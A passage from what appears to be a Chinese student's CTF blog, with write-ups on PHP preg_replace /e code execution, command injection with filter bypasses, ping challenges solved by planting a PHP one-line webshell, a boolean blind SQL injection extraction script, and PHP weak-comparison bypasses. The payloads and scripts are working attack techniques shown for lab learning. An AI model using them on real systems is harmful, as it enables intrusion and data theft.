<p><img src="https://note.youdao.com/yws/api/personal/file/WEB549c53f048baefbb5343e5d81b582040?method=download&shareKey=98773d41a7a776f8d82604d7c6187ede"></p>
</li>
<li><p>这里需要调用<code>getFlag()</code>函数来读flag，即利用preg_replace /e漏洞进行代码执行</p>
<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;var&#x2F;tmp&#x2F;flag%27);</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB46823b2daf9f0cb7287796f11226cc44?method=download&shareKey=dbd804e7c99bed316d1b6ff192211a39"></p>
</li>
</ul>
<p>资料引用</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.preg-replace.php">https://www.php.net/manual/zh/function.preg-replace.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php</a></p>
</blockquote>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">命令执行漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-27</time><div class="content"><p> <strong>命令执行（Command Execution）</strong>漏洞是指由于web服务器存在安全漏洞，使恶意代码被执行，导致信息泄露或shell权限被拿下，可以发生在web的各种组件，大多是对输入命令安全检测不足导致。</p>
<h1 id="系统命令执行漏洞"><a href="#系统命令执行漏洞" class="headerlink" title="系统命令执行漏洞"></a>系统命令执行漏洞</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号</span><br><span class="line">···</span><br></pre></td></tr></table></figure>

<p>以上为常用于执行系统命令的函数，多用于执行ping的网页，通常在利用时会用到管道符。</p>
<h2 id="常见管道符"><a href="#常见管道符" class="headerlink" title="常见管道符"></a>常见管道符</h2><h3 id="windows系统支持的管道符"><a href="#windows系统支持的管道符" class="headerlink" title="windows系统支持的管道符"></a>windows系统支持的管道符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;|&quot;直接执行后面的语句</span><br><span class="line">&quot;||&quot;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&quot;&amp;&quot;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&quot;&amp;&amp;&quot;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>

<h3 id="Linux系统支持的管道符"><a href="#Linux系统支持的管道符" class="headerlink" title="Linux系统支持的管道符"></a>Linux系统支持的管道符</h3><p>与windows系统基本一致，多了一个<code>；</code>，用法同<code>&amp;</code>。</p>
<h2 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h2><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>这是最常见的限制，也是最容易绕过的限制。</p>
<ul>
<li><p>${IFS}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">cat$&#123;IFS&#125;flag</span><br><span class="line">cat$&#123;IFS&#125;$1flag</span><br><span class="line">cat$IFS$1flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>&lt;&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">cat&lt;&gt;flag</span><br><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>%09</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">cat%09flag</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ul>
<li><p>拼接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bash   Y2F0IGZsYWc&#x3D;即为</span><br><span class="line">Y2F0IGZsYWc&#x3D;即为&quot;cat flag&quot;base64编码</span><br></pre></td></tr></table></figure>
</li>
<li><p>引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at fl&#39;&#39;ag</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>反斜线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br><span class="line">cat flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="绕过前缀限制"><a href="#绕过前缀限制" class="headerlink" title="绕过前缀限制"></a>绕过前缀限制</h3><p>用分号和管道符绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls;cat &#x2F;flag</span><br><span class="line">ls&amp;&amp;cat &#x2F;flag</span><br><span class="line">ls&amp;cat &#x2F;flag</span><br><span class="line">ls|cat &#x2F;flag</span><br><span class="line">ls||cat &#x2F;flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="读文件绕过"><a href="#读文件绕过" class="headerlink" title="读文件绕过"></a>读文件绕过</h3><p>cat被过滤用一下命令代替</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><p>通过<code>&gt;</code>将命令输入文件名中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat zbc.txt</span><br><span class="line">echo &quot;520&quot;&gt;zbc.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="ping1"><a href="#ping1" class="headerlink" title="ping1"></a>ping1</h3><ul>
<li><p>首先看一下文件列表</p>
<p><code>127.0.0.1|ls</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa1eba71c8713ee2b70604b32dbfa170d?method=download&shareKey=6e605a8682108dc1ab8c436fdf850d60"></p>
</li>
<li><p>直接写一个一句话木马传进去试试，记得在<code>$</code>前加上转义字符</p>
</li>
</ul>
<p>``127.0.0.1|echo “<?php @eval(\$_POST[cmd]);?>“&gt;shell.php`</p>
<ul>
<li><p>写入成功，用蚁剑读flag</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB04b374b8b2375a0b69575cb7fc9e46b2?method=download&shareKey=6a35ca8eb03b89bc5573b8f8ecd1f99e"></p>
</li>
</ul>
<h3 id="ping2"><a href="#ping2" class="headerlink" title="ping2"></a>ping2</h3><ul>
<li><p>先找一下flag</p>
<p><code>127.0.0.1|find / -name &quot;flag&quot;</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcfcbe1df17c099e201e94e929e492fcd?method=download&shareKey=eb7ffb43ef8a04fd24376962371cad47"></p>
</li>
<li><p>读flag</p>
<p><code> 127.0.0.1|cat /tmp/flag</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5c0aa26e308726cbcf4370410601c7bd?method=download&shareKey=1fc85dafc5603433410e2d7569f57026"></p>
</li>
</ul>
<h3 id="ping3"><a href="#ping3" class="headerlink" title="ping3"></a>ping3</h3><ul>
<li><p>同样找flag，发现空格被过滤，用<code>$IFS$9</code>绕过</p>
<p><code>127.0.0.1&amp;&amp;find$IFS$9/$IFS$9-name$IFS$9&quot;flag&quot;</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB78c8ed2ef9c1460469bea1954f6bc6e9?method=download&shareKey=bad786447fad986f71855d394b358e4b"></p>
</li>
<li><p>绕过空格发现对flag进行保护，再绕找到flag</p>
<p><code>127.0.0.1&amp;&amp;find$IFS$9/$IFS$9-name$IFS$9&quot;fla&quot;&quot;g&quot;</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe6fdf5ee65d73a09b9e6e5f57738f5cf?method=download&shareKey=fdb63644ac7c68d948b6182b2fa7f1a3"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB15d502c93f4941aa58957fcacb391061?method=download&shareKey=2c6a44a2839999a28d307a48b2d7ba67"></p>
</li>
<li><p>最后读flag</p>
<p><code>127.0.0.1&amp;&amp;cat%09/fla&quot;&quot;g</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBbaf1c844fe3c75579a971a8f693cd8e4?method=download&shareKey=7c7e4ca4f072c7de20aaf42fb9cae525"></p>
</li>
</ul>
<h3 id="ping4"><a href="#ping4" class="headerlink" title="ping4"></a>ping4</h3><ul>
<li><p>同样看列表，发现<code>ls</code>不行，换<code>dir</code>试下读到flag</p>
<p><code>127.0.0.1&amp;&amp;dir</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBabaf9e543dea0d362bf802222f756291?method=download&shareKey=c78f35b47c72a5b504eecedfa8a0af08"></p>
</li>
<li><p><code>.bak</code>是备份文件，下载发现是源码</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB3dbeab12d4ef868e2623b8c45bee553b?method=download&shareKey=effa52c0ebde61cde90d6fcb8491089b"></p>
</li>
<li><p>过滤了很多东西，用<code>\</code>绕过过滤读到flag</p>
<p><code> 127.0.0.1&amp;&amp;c\a\t /flag</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB095d51ce4c4ee6e6cc72b10d944f4681?method=download&shareKey=e997e6fcd994fc12199c917cec90bc8e"></p>
</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/31/%E5%9F%BA%E4%BA%8E%E8%BF%90%E8%A1%8C%E9%94%99%E8%AF%AF%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">基于运行错误的布尔盲注</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-31</time><div class="content"><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。 通过一道题学习一下布尔盲注。</p>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>布尔盲注就是通过页面返回的true或false两种不同类型来猜测数据，注入攻击。</p>
<p>当输入cat=1’时显示如图，可以判断存在注入。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc0420bd95fa2ce1aa7cf46126215f4fd?method=download&shareKey=a82b932092e83d8fce0dbf6d5c2a23b3"></p>
<p>即当不存在过滤内容时，返回cat.png，当存在过滤内容时则返回nono.png。可以判断这是布尔注入。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBeef04c91cadf52f3fb1374b2fc8aa443?method=download&shareKey=5c12eaa62b88ead873c39b0deae41aa5"></p>
<p>先看一下被ban掉的关键字。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">union</span><br><span class="line">*</span><br><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">substr</span><br><span class="line">mid</span><br><span class="line">&#x3D;</span><br><span class="line">like</span><br><span class="line">into</span><br><span class="line">file</span><br><span class="line">sleep</span><br><span class="line">benchmark</span><br><span class="line">^</span><br><span class="line">or</span><br><span class="line">空格</span><br><span class="line">&amp;</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">#</span><br><span class="line">-</span><br><span class="line">ascii</span><br><span class="line">ord</span><br></pre></td></tr></table></figure>

<p>因为之前没有接触过这类，所以并没有思路，以下是在看了gq师兄的writeup后做的。</p>
<h1 id="ST-X和ST-GeomFromText-函数"><a href="#ST-X和ST-GeomFromText-函数" class="headerlink" title="ST_X和ST_GeomFromText 函数"></a>ST_X和ST_GeomFromText 函数</h1><p>这里用到了这两个函数，这都是空间函数，ST_X是返回一个坐标的x坐标，所以需要用Point函数来传入坐标 ，ST_GeomFromText方法即根据字符串表示构造几何，语法为<code>ST_GeomFromText(character-string,srid)</code>，character-string:包含几何文本表示的字符串，输入格式可以是任何支持的文本输入格式，包括标准文本（WKT)或扩展标准文本（EWKT）<br>srid为空间引用标识符。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB81732ceffb5bed751c13743dd724faca?method=download&shareKey=92d5e82ec8f433892546e7f98d39e55f"></p>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>前面知道空格被过滤，这里可以用<code>\t</code>来代替，url编码为<code>%09</code>，用IF函数返回值来判断盲注结果，payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&#x3D;1%09and%09IF(0,ST_X(ST_GeomFromText(&#39;POINT(wing)&#39;)),0)</span><br></pre></td></tr></table></figure>

<p>由于单双引号都被过滤，因而需要将<code>&#39;POINT(wing)&#39;</code>转为16进制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> var_dump(bin2hex(<span class="string">&quot;POINT(wing)&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   结果为<span class="number">504</span>f494e542877696e6729</span><br></pre></td></tr></table></figure>

<p>最终payload即为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&#x3D;1%09and%09IF(0,ST_X(ST_GeomFromText(504f494e542877696e6729)),0)</span><br></pre></td></tr></table></figure>

<p>用gq师兄的脚本跑出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author：Gqleung</span></span><br><span class="line"><span class="comment">#Email:  admin@plasf.cn</span></span><br><span class="line"><span class="comment">#blog:   http://www.plasf.cn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span>(<span class="params">string</span>):</span></span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		r = hex(ord(i));</span><br><span class="line">		r = r.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		result = result+r</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28016/index.php?cat=&quot;</span></span><br><span class="line">tables = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">70</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line">		<span class="keyword">if</span> j ==<span class="string">&quot;&#123;&quot;</span> <span class="keyword">or</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">			j=<span class="string">&#x27;\\&#x27;</span>+j</span><br><span class="line">		payload = <span class="string">&quot;1	and	IF((select	flag	from	flag)	regexp	binary	%s,	ST_X(ST_GeomFromText(0x504F494E54286D61647329)),	0)&quot;</span>%(ord2hex(<span class="string">&quot;^&quot;</span>+result+j))</span><br><span class="line">		r = requests.get(url+payload);</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;cat&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			result=result+j</span><br><span class="line">			print(result.replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBd1d7493830bfeea86ba7cce0c2757c09?method=download&shareKey=bd9704c2138822969b6e5ada66192b2c"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题是基于运行错误的布尔盲注，用到了空间函数，这是新的知识点，由于之前一直没有接触sql注入，所以这道题对于我来说是很陌生的，很多sql注入的基础知识点都不懂，即使有writeup依旧是一知半解，可以说这是一篇失败的文章，等学习完sql注入的内容后再补充修改完善。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/30/PHP%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/">PHP中的弱类型比较</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-30</time><div class="content"><p>之前在许多题目中都有涉及到php中的弱类型比较的知识点，今天就总结一下php中的弱类型比较问题。</p>
<h1 id="“-”与“-”"><a href="#“-”与“-”" class="headerlink" title="“==”与“===”"></a>“==”与“===”</h1><p>之前在学习反序列化的知识时有一道题就涉及到这个，在php中<code>==</code>不比较变量类型，是弱等于，<code>===</code>会比较变量类型，是强等于。</p>
<p><code>==</code>在比较时，会先将字符串转换成数值再进行比较。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> var_dump(<span class="string">&quot;adc&quot;</span>==<span class="number">0</span>); </span><br><span class="line"> var_dump(<span class="string">&quot;1adc&quot;</span>==<span class="number">1</span>); </span><br><span class="line"> var_dump(<span class="string">&quot;abc1&quot;</span>==<span class="number">1</span>);</span><br><span class="line"> var_dump(<span class="string">&quot;abc1&quot;</span>==<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf2fc06ff7ecb2b719555d883e71b71c0?method=download&shareKey=2f8c9d117bab1977e6aec6ab096340f6"></p>
<p>如图，abc被强制转换，结果为0，第二个<code>1abc</code>以合法数据开头，则以该数为值。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBff21360922d675fa04b0f281236aba0f?method=download&shareKey=5acc0198d43bf804488cb88815b4e768"></p>
<p><code>===</code>在比较时先比较类型再比较数值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> var_dump(<span class="number">1</span>===<span class="number">1</span>); </span><br><span class="line"> var_dump(<span class="string">&quot;1&quot;</span>===<span class="number">1</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2b65dcf45d0405222452683703b0c544?method=download&shareKey=7d5d8fe19790d22fe739bc63cb78e445"></p>
<h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) == md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>md5()函数无法处理数组，若传进去为数组则返回null，当我们传进两个数组时即相等绕过。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB10b764d0b72c2d7255b00aad18355f00?method=download&shareKey=a7992f07d1ffabef773b5b00e3be15b6"></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>md5开头是0e的字符串，而<code>0e</code>开头在3比较的时候会看作科学计数法，无论<code>0e</code>后是什么均为0。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc8e53fa90bdefafc1d751e4433e8287a?method=download&shareKey=097ec1d41128ec69f9bb68145d958729"></p>
<p>所以只需要输入两个md5加密后是0e开头的字符串即可绕过。这里是部分对照。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>

<p>因此选择两个传入即可。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB01d655a837404245e3387afb606fcb93?method=download&shareKey=7cfbb16338d666e4f2d9766909cf0f2a"></p>
<h2 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h2><p>原理同上</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBd3587d9a2ffcfe90d825359d81d27cf8?method=download&shareKey=8e51445e21ae95e5f6d55055f1d990dc"></p>
<h2 id="strcmp-绕过"><a href="#strcmp-绕过" class="headerlink" title="strcmp()绕过"></a>strcmp()绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=<span class="string">&quot;***************&quot;</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">&#x27;password&#x27;</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Right!!!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p> strcmp<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0/301912">函数</a>是string compare(字符串比较)的缩写，用于比较两个字符串并根据比较结果返回整数。基本形式为strcmp(str1,str2)，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。 </p>
</blockquote>
<p>strcmp()是传入字符串类型，若传入数组则错误，但会判断其相等。</p>
<p>payload即为<code>password[]=abc</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB283f6fef26cc7e2abc6665209122eede?method=download&shareKey=1b88163accd2e4f0b51c75d70fef27d7"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/23/%E4%B8%A4%E9%81%93web%E7%BB%83%E4%B9%A0/">两道web练习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-23</time><div class="content"><p>Gq师兄出的两道web题，记录一下解题过程和知识点。</p>
<h1 id="Guojingming"><a href="#Guojingming" class="headerlink" title="Guojingming"></a>Guojingming</h1><p>题目源码</p>
